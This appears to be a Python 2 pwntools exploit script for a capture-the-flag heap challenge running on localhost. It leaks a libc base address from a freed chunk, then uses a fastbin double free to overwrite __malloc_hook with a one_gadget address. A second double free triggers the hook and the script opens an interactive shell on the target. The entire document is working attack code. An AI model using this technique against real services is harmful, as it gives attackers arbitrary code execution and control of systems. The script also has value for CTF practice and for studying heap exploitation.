from pwn import *

context.log_level=True



local = 1

if local:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	r = remote("localhost",8026)
	pause()
else:
	r = remote("",8026)
	pause()


def alloc(r,size,data):
	print r.recvuntil(">>")
	r.sendline("1")
	print r.recvuntil(">>")
	r.sendline(str(size))
	print r.recvuntil(">>")
	r.send(str(data))

def free(r,index):
	print r.recvuntil(">>")
	r.sendline("2")
	print r.recvuntil(">>")
	r.sendline(str(index))


def display(r,index):
	print r.recvuntil(">>")
	r.sendline("4")
	print r.recvuntil(">>")
	r.sendline(str(index))
	

#libc leak
alloc(r,256,"O")	
alloc(r,256,"N")

free(r,0)

display(r,0)

print r.recvline()

libc_base = u64(r.recvline()[0:8])-0x3c4b78
malloc_hook = libc_base+libc.symbols['__malloc_hook']
system = libc_base+libc.symbols['system']
binsh = libc_base+0x18cd17
one_gadget = libc_base+0xf0274

print "[*]Libc_Base:",hex(libc_base)
print "[*]Malloc:",hex(malloc_hook)
print "[*]One Gadget:",hex(one_gadget)

#Exploit 

alloc(r,104,"T") 
alloc(r,104,"Y") 
alloc(r,256,"E") 

#fastbin dup -> http://github.com/shellphish/how2heap
free(r,3) 
free(r,2) 
free(r,3) 

alloc(r,104,p64(malloc_hook-0x23)) 
alloc(r,104,"L") #a
alloc(r,104,"O") #b

#overwrite

payload = "V"*3
payload += p64(one_gadget)
payload += p64(one_gadget)
payload += p64(one_gadget)
payload += p64(one_gadget)

alloc(r,104,payload)

#Trigger
free(r,"1")
free(r,"1")

r.interactive()

